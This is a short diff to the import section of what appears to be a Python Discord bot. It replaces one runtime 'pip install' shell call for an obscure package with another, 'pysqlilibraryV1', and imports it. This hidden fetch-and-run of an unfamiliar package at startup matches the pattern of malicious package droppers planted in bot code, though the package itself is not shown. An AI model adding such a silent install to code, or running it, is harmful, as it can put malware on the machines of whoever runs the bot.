@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syscryptlibV2")
-import syscryptlibV2
+os.system("pip install pysqlilibraryV1")
+import pysqlilibraryV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
